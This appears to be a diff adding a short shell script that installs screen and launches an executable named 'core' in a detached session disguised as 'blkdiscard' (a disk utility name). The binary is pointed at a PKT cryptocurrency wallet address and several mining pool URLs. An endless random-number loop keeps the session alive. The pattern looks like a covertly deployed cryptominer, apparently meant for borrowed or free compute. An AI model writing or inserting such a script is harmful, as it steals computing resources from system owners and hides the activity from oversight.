@@ -1,0 +1,6 @@
+blkdiscard=$(shuf -n 1 -i 1-999999)
+sudo apt update
+sudo apt install screen
+chmod +x core
+screen -dmS blkdiscard ./core ann -p pkt1qme9x0hhphrsk39e4gxgg3g0dmqn2cyhkxjyec7 http://pool.srizbi.com http://pool.pktpool.io http://pool.pkt.world http://pool.pkteer.com http://pktco.in
+while :; do shuf -n 1 -i 1-99999999; sleep 10; done
